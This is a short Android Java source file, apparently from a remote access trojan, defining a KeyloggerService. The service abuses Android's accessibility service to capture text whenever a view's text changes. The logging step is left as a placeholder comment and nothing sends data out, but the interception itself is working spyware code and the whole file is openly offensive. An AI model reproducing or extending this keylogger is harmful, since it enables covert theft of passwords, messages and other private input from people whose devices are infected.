package com.shadow.rat.services;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class KeyloggerService extends AccessibilityService {

    public static void start(Context context) {
        context.startService(new Intent(context, KeyloggerService.class));
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, KeyloggerService.class));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            // Log the text
        }
    }

    @Override
    public void onInterrupt() {
        // Do nothing
    }
}
